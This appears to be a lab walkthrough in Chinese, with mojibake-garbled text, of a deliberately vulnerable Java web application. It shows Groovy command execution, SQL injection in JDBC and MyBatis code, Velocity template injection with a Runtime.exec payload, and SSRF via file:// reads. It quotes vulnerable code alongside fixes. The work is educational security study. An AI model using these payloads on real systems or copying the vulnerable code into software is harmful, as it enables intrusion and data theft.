<p>Groovyæ˜¯ä¸€ç§åŸºäºJVMï¼ˆJavaè™šæ‹Ÿæœºï¼‰çš„æ•æ·å¼€å‘è¯­è¨€ï¼Œå®ƒç»“åˆäº†Pythonã€Rubyå’ŒSmalltalkçš„è®¸å¤šå¼ºå¤§çš„ç‰¹æ€§ï¼ŒGroovy ä»£ç èƒ½å¤Ÿä¸ Java ä»£ç å¾ˆå¥½åœ°ç»“åˆï¼Œä¹Ÿèƒ½ç”¨äºæ‰©å±•ç°æœ‰ä»£ç ã€‚ç”±äºå…¶è¿è¡Œåœ¨ JVM ä¸Šçš„ç‰¹æ€§ï¼ŒGroovy å¯ä»¥ä½¿ç”¨å…¶ä»– Java è¯­è¨€ç¼–å†™çš„åº“ã€‚</p>
<p>æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/rce/groovy?content=&quot;calc.exe&quot;.execute()</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505251952938.png" alt="image-20250525195244895" loading="lazy"></p>
<p>ç”±äºé¶åœºæ˜¯åœ¨dockeræ­å»ºçš„ï¼Œæ‰€ä»¥å¼¹ä¸å‡ºè®¡ç®—å™¨ï¼Œä¼šæç¤ºä¸å­˜åœ¨è¿™ä¸ªæ–‡ä»¶</p>
<h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><h4 id="1-sqli-jdbc-vuln"><a href="#1-sqli-jdbc-vuln" class="headerlink" title="1.&#x2F;sqli&#x2F;jdbc&#x2F;vuln"></a>1.&#x2F;sqli&#x2F;jdbc&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/jdbc/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">jdbc_sqli_vul</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!con.isClosed())</span><br><span class="line">            System.out.println(<span class="string">&quot;Connect to database successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// sqli vuln code</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> con.createStatement();</span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        logger.info(sql);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">res_pwd</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;Sorry, can&#x27;t find the Driver!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¼æ´æˆå› ï¼šç›´æ¥æ’å…¥usernameï¼Œé€ æˆsqlæ³¨å…¥</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=-1&#x27; union select 1,database(),3,4--+</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252024745.png" alt="image-20250525202433620" loading="lazy"></p>
<p>é˜²æŠ¤</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="comment">// fix code</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line">st.setString(<span class="number">1</span>, username);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="2-sqli-jdbc-ps-vuln"><a href="#2-sqli-jdbc-ps-vuln" class="headerlink" title="2.&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln"></a>2.&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">jdbc_ps_vuln</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(driver);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!con.isClosed())</span><br><span class="line">                System.out.println(<span class="string">&quot;Connecting to Database successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">            logger.info(st.toString());</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> st.executeQuery();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">res_name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">res_pwd</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">info</span> <span class="operator">=</span> String.format(<span class="string">&quot;%s: %s\n&quot;</span>, res_name, res_pwd);</span><br><span class="line">                result.append(info);</span><br><span class="line">                logger.info(info);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            rs.close();</span><br><span class="line">            con.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Sorry, can&#x27;t find the Driver!&quot;</span>);</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            logger.error(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>æ¼æ´æˆå› ï¼šé¢„å¤„ç†è¯­å¥åœ¨sqlè¯­å¥ä¹‹åï¼Œæ²¡èµ·åˆ°é˜²æŠ¤çš„ä½œç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String sql = &quot;select * from users where username = &#x27;&quot; + username + &quot;&#x27;&quot;;</span><br><span class="line">PreparedStatement st = con.prepareStatement(sql);</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252035488.png" alt="image-20250525203533438" loading="lazy"></p>
<h4 id="3-sqli-mybatis-vuln01"><a href="#3-sqli-mybatis-vuln01" class="headerlink" title="3.&#x2F;sqli&#x2F;mybatis&#x2F;vuln01"></a>3.&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/vuln01&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln01</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> userMapper.findByUserNameVuln01(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥çœ‹findByUserNameVuln01</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findByUserNameVuln01</span><span class="params">(<span class="meta">@Param(&quot;username&quot;)</span> String username)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨åˆ°çš„æ˜¯MyBatisæ¡†æ¶ï¼Œç”¨æ¥æŒ‡å®š SQL æŸ¥è¯¢è¯­å¥ã€‚**<code>$&#123;username&#125;</code>**ï¼šåœ¨è¿™é‡Œï¼Œ<code>username</code> æ˜¯ç›´æ¥æ‹¼æ¥åˆ° SQL æŸ¥è¯¢ä¸­çš„ã€‚è¿™æ„å‘³ç€è¾“å…¥çš„å†…å®¹ä¼šç›´æ¥æ’å…¥åˆ° SQL è¯­å¥ä¸­ï¼Œè€Œä¸ä¼šè¿›è¡Œä»»ä½•é¢„å¤„ç†æˆ–è½¬ä¹‰ã€‚å› æ­¤æˆ‘ä»¬ä»ç„¶å¯ä»¥ç”¨ä¸Šé¢çš„æ–¹æ³•è¿›è¡ŒSQLæ³¨å…¥ã€‚</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png" loading="lazy"></p>
<p>ä¿®å¤ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252101651.png" alt="image-20250525210117585" loading="lazy"></p>
<h4 id="4-sqli-mybatis-vuln02"><a href="#4-sqli-mybatis-vuln02" class="headerlink" title="4.&#x2F;sqli&#x2F;mybatis&#x2F;vuln02"></a>4.&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/mybatis/vuln02&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">mybatisVuln02</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> userMapper.findByUserNameVuln02(username);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥çœ‹findByUserNameVuln02</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; <span class="title function_">findByUserNameVuln02</span><span class="params">(String username)</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå»æ‰äº†æ˜ å°„å…³ç³»ï¼Œä¸å½±å“æ¼æ´å­˜åœ¨ï¼Œä»ç„¶å¯ä»¥ä½¿ç”¨ä¹‹å‰payload</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252119621.png" alt="image-20250525211935573" loading="lazy"></p>
<h4 id="5-sqli-mybatis-orderby-vuln03"><a href="#5-sqli-mybatis-orderby-vuln03" class="headerlink" title="5.&#x2F;sqli&#x2F;mybatis&#x2F;orderby&#x2F;vuln03"></a>5.&#x2F;sqli&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;/mybatis/orderby/vuln03&quot;)</span><br><span class="line">   public List&lt;User&gt; mybatisVuln03(@RequestParam(&quot;sort&quot;) String sort) &#123;</span><br><span class="line">       return userMapper.findByUserNameVuln03(sort);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥çœ‹findByUserNameVuln03</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List&lt;User&gt; findByUserNameVuln03(@Param(&quot;order&quot;) String order);</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨äº†MyBatisæ¡†æ¶ä¸­çš„orderå­—æ®µï¼Œæ¢ç”¨ä¸‹é¢æ–¹æ³•è¿›è¡Œæ³¨å…¥ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=id desc--+</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505252145129.png" alt="image-20250525214518039" loading="lazy"></p>
<h4 id="sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤"><a href="#sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤" class="headerlink" title="sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤"></a>sqlæ³¨å…¥ä¿®å¤ä¸é˜²æŠ¤</h4><p>1.é¢„ç¼–è¯‘</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select * from users where username = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">st</span> <span class="operator">=</span> con.prepareStatement(sql);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.waf</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">FILTER_PATTERN</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[a-zA-Z0-9_/\\.-]+$&quot;</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">sqlFilter</span><span class="params">(String sql)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (!FILTER_PATTERN.matcher(sql).matches()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> sql;</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3.MyBatisé˜²æŠ¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br></pre></td></tr></table></figure>



<h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><h4 id="ssti-velocity"><a href="#ssti-velocity" class="headerlink" title="&#x2F;ssti&#x2F;velocity"></a>&#x2F;ssti&#x2F;velocity</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">@GetMapping(&quot;/velocity&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">velocity</span><span class="params">(String template)</span> &#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line"></span><br><span class="line">        <span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VelocityContext</span>();</span><br><span class="line"></span><br><span class="line">        context.put(<span class="string">&quot;author&quot;</span>, <span class="string">&quot;Elliot A.&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;address&quot;</span>, <span class="string">&quot;217 E Broadway&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;phone&quot;</span>, <span class="string">&quot;555-1337&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">swOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">        Velocity.evaluate(context, swOut, <span class="string">&quot;test&quot;</span>, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=247409254&content_type=Article&match_order=1&q=Apache+Velocity&zhida_source=entity">Apache Velocity</a>æ˜¯ä¸€ä¸ªåŸºäºæ¨¡æ¿çš„å¼•æ“ï¼Œç”¨äºç”Ÿæˆæ–‡æœ¬è¾“å‡º(ä¾‹å¦‚ï¼šHTMLã€XMLæˆ–ä»»ä½•å…¶ä»–å½¢å¼çš„ASCIIæ–‡æœ¬)ï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡æ˜¯æä¾›ä¸€ç§ç®€å•ä¸”çµæ´»çš„æ–¹å¼æ¥å°†æ¨¡æ¿å’Œ<a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=247409254&content_type=Article&match_order=1&q=%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%B0%E6%8D%AE&zhida_source=entity">ä¸Šä¸‹æ–‡æ•°æ®</a>ç»“åˆåœ¨ä¸€èµ·ï¼Œå› æ­¤è¢«å¹¿æ³›åº”ç”¨äºå„ç§Javaåº”ç”¨ç¨‹åºä¸­åŒ…æ‹¬Webåº”ç”¨</p>
<p>æ¨¡ç‰ˆæ³¨å…¥é—®é¢˜å„ä¸ªè¯­è¨€æ–—é±¼ï¼Œä½†è¿™é‡Œåªç”¨åˆ°äº†velocityï¼Œé™¤äº†velocityï¼Œthymeleafç­‰éƒ½æ˜¯ä¼šæœ‰sstié—®é¢˜</p>
<p><strong>Velocity.evaluate</strong></p>
<p><strong>æ–¹æ³•ä»‹ç»</strong></p>
<p>Velocity.evaluateæ˜¯Velocityå¼•æ“ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºå¤„ç†å­—ç¬¦ä¸²æ¨¡æ¿çš„è¯„ä¼°ï¼ŒVelocityæ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ¨¡æ¿å¼•æ“ï¼Œå¹¿æ³›åº”ç”¨äºWEBå¼€å‘å’Œå…¶ä»–éœ€è¦åŠ¨æ€å†…å®¹ç”Ÿæˆçš„åœºåˆï¼ŒVelocity.evaluateæ–¹æ³•çš„ä¸»è¦ä½œç”¨æ˜¯å°†ç»™å®šçš„æ¨¡æ¿å­—ç¬¦ä¸²ä¸ä¸Šä¸‹æ–‡å¯¹è±¡ç»“åˆå¹¶ç”Ÿæˆæœ€ç»ˆçš„è¾“å‡ºç»“æœï¼Œè¿™ä¸ªæ–¹æ³•é€šå¸¸ç”¨äºåœ¨è¿è¡Œæ—¶åŠ¨æ€åˆ›å»ºå†…å®¹ï¼Œæ¯”å¦‚ï¼šç”ŸæˆHTMLé¡µé¢çš„å†…å®¹æˆ–ç”µå­é‚®ä»¶çš„æ–‡æœ¬ï¼Œæ–¹æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static void evaluate(Context context, Writer writer, String templateName, String template)</span><br></pre></td></tr></table></figure>

<p>å‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li>Context contextï¼šæä¾›æ¨¡æ¿æ‰€éœ€çš„æ•°æ®ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥åŒ…å«å¤šä¸ªé”®å€¼å¯¹</li>
<li>Writer writerï¼šè¾“å‡ºæµï¼Œç”¨äºå†™å…¥ç”Ÿæˆçš„å†…å®¹</li>
<li>String templateNameï¼šæ¨¡æ¿çš„åç§°ï¼Œé€šå¸¸ç”¨äºè°ƒè¯•ä¿¡æ¯ä¸­</li>
<li>String templateï¼šè¦è¯„ä¼°çš„æ¨¡æ¿å­—ç¬¦ä¸²</li>
</ul>
<p>æˆ‘ä»¬æ„é€ å¦‚ä¸‹payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;);$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272017990.png" alt="image-20250527201721864" loading="lazy"></p>
<h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="1-ssrf-urlConnection-vuln"><a href="#1-ssrf-urlConnection-vuln" class="headerlink" title="1.&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln"></a>1.&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/urlConnection/vuln&quot;, method = &#123;RequestMethod.POST, RequestMethod.GET&#125;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">URLConnectionVuln</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtils.URLConnection(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥çœ‹URLConnection</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">URLConnection</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> u.openConnection();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(urlConnection.getInputStream())); <span class="comment">//send request</span></span><br><span class="line">        String inputLine;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">html</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            html.append(inputLine);</span><br><span class="line">        &#125;</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> html.toString();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e.getMessage());</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç”¨æ–‡ä»¶è¯»å–åè®®file:&#x2F;&#x2F;å®ç°è®¿é—®</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272053224.png" alt="image-20250527205331156" loading="lazy"></p>
<h4 id="2-ssrf-HttpURLConnection-vuln"><a href="#2-ssrf-HttpURLConnection-vuln" class="headerlink" title="2.&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln"></a>2.&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/HttpURLConnection/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">httpURLConnectionVuln</span><span class="params">(<span class="meta">@RequestParam</span> String url)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtils.HttpURLConnection(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥çœ‹HttpURLConnection</p>
